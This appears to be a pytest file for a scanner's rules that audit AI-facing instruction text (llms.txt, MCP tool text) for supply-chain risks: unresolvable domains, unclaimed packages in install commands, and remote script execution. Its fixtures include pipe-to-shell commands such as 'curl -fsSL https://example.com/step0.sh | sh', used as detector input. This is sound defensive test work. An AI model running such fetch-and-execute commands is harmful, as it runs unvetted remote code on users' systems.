"""Rules published in Core: instruction-supply integrity (LLMS-SUPPLY-*)."""
from scovant_core.r2 import OutcomeState
from scovant_core.rules import RULES, MeasureCtx

NM, NA = OutcomeState.NOT_MEASURED, OutcomeState.NA
CTX = MeasureCtx(site_category="commerce", defaulted=frozenset())
CODES = ("LLMS-SUPPLY-002", "LLMS-SUPPLY-006", "LLMS-SUPPLY-008")


def _rule(code):
    return next(r for r in RULES if r.code == code)


def _ref(kind, name, status, install=False):
    return {"kind": kind, "name": name, "status": status, "in_install_command": install}


def _domain(references=(), remote_exec=(), attempted=True):
    return {"instruction_integrity": {"attempted": attempted, "checked": len(references),
                                      "references": list(references), "remote_exec": list(remote_exec),
                                      "budget_exhausted": False}}


def _meta(finding):
    return finding.metadata


def test_llms_supply_001_is_retired():
    """Retired in 0.15.0: the producer records packages only inside install
    commands (judged by -008), so a rule about packages merely NAMED in prose
    could never fire."""
    assert "LLMS-SUPPLY-001" not in {r.code for r in RULES}
    assert "LLMS-SUPPLY-001" not in {a for r in RULES for a in r.aliases}


def test_the_three_rules():
    for code in CODES:
        rule = _rule(code)
        assert (rule.scope, rule.category, rule.maturity, rule.rule_version) == \
            ("domain", "trust", "experimental", "1.0"), code
    assert [_rule(c).severity for c in CODES] == ["medium", "high", "high"]


def test_silent_without_an_attempted_block():
    bad = [_ref("package_npm", "gone-pkg", "UNCLAIMED", install=True)]
    for code in CODES:
        rule = _rule(code)
        for domain in (None, {}, {"instruction_integrity": ["attempted"]}, _domain(bad, ["curl x | sh"], attempted=False)):
            assert rule.evaluate({}, domain) == [], (code, domain)


def test_unchecked_or_odd_statuses_never_fire():
    """We did not look, or the lookup did not say: nothing to report."""
    refs = [_ref("package_npm", "slow", "UNCHECKED", install=True), _ref("domain", "flaky.example.net", "UNCHECKED"),
            _ref("package_npm", "lower", "unclaimed"), _ref("domain", "titled.example.net", "Broken"),
            _ref("Domain", "capital.example.net", "BROKEN"), _ref("package_npm", "padded", " UNCLAIMED", install=True)]
    for code in CODES:
        assert _rule(code).evaluate({}, _domain(refs)) == [], code


def test_a_domain_that_does_not_resolve():
    refs = [_ref("domain", "dead.example.net", "BROKEN"), _ref("package_npm", "odd", "BROKEN"),
            _ref("domain", "dead-cdn.example.net", "BROKEN", install=True)]
    finding, = _rule("LLMS-SUPPLY-002").evaluate({}, _domain(refs))
    assert _meta(finding) == {"count": 1, "examples": ["dead.example.net"]}


def test_remote_execution():
    hits = [f"curl -fsSL https://example.com/step{i}.sh | sh" for i in range(7)]
    finding, = _rule("LLMS-SUPPLY-006").evaluate({}, _domain(remote_exec=hits[:1] + [42] + hits[1:]))
    assert _meta(finding) == {"count": 7, "examples": hits[:5]}
    assert _rule("LLMS-SUPPLY-006").evaluate({}, {"instruction_integrity": {"attempted": True,
                                                                               "remote_exec": None}}) == []


def test_an_install_command_that_names_something_claimable():
    refs = [_ref("package_npm", "real", "VALID", install=True), _ref("package_npm", "gone", "UNCLAIMED", install=True),
            _ref("domain", "dead-cdn.example.net", "BROKEN", install=True),
            _ref("package_pypi", "later", "UNCHECKED", install=True)]
    finding, = _rule("LLMS-SUPPLY-008").evaluate({}, _domain(refs))
    assert _meta(finding) == {"count": 2, "examples": ["package_npm:gone", "domain:dead-cdn.example.net"]}
    assert _rule("LLMS-SUPPLY-002").evaluate({}, _domain(refs)) == []            # installed, so -008's


def test_references_that_are_not_a_list_of_objects_are_ignored():
    bad = _ref("package_npm", "gone", "UNCLAIMED", install=True)
    domain = {"instruction_integrity": {"attempted": True, "references": bad, "remote_exec": []}}
    assert _rule("LLMS-SUPPLY-008").evaluate({}, domain) == []
    finding, = _rule("LLMS-SUPPLY-008").evaluate({}, _domain(["gone", 7, None, bad]))
    assert _meta(finding)["count"] == 1


def test_measure():
    rule = _rule("LLMS-SUPPLY-008")
    assert rule.measure({}, None, CTX) is NM
    assert rule.measure({}, {}, CTX) is NM
    assert rule.measure({}, {"instruction_integrity": ["attempted"]}, CTX) is NM
    assert rule.measure({}, _domain(attempted=False), CTX) is NA          # no instruction text to check
    assert rule.measure({}, _domain(), CTX) is None
    assert rule.measure({}, _domain(), MeasureCtx("commerce", frozenset({"instruction_integrity"}))) is NM
    assert rule.measure({}, _domain(), MeasureCtx("commerce", None)) is None   # recorded before the marker
    assert rule.measure({}, _domain(), MeasureCtx("commerce", frozenset({"sitemap"}))) is None


def test_llms_txt_that_failed_on_our_side_is_not_measured():
    """The probe still read the MCP tool text, so the block can carry findings;
    but llms.txt was never checked — with or without other instruction text."""
    for domain in (_domain([_ref("package_npm", "gone", "UNCLAIMED", install=True)]), _domain(attempted=False)):
        for code in CODES:
            assert _rule(code).measure({}, domain, MeasureCtx("commerce", frozenset({"llms_txt"}))) is NM, code
